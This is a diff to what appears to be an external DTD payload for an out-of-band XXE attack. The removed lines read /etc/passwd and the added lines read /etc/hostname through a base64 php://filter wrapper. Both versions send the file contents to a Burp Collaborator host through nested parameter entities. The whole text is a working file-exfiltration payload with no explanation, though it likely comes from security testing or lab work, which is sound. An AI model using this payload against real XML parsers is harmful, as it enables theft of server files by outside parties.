@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://fudhdet0go40f11ofg1aqcvlnct2hr.burpcollaborator.net/?x=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://fudhdet0go40f11ofg1aqcvlnct2hr.burpcollaborator.net/%data;'>">
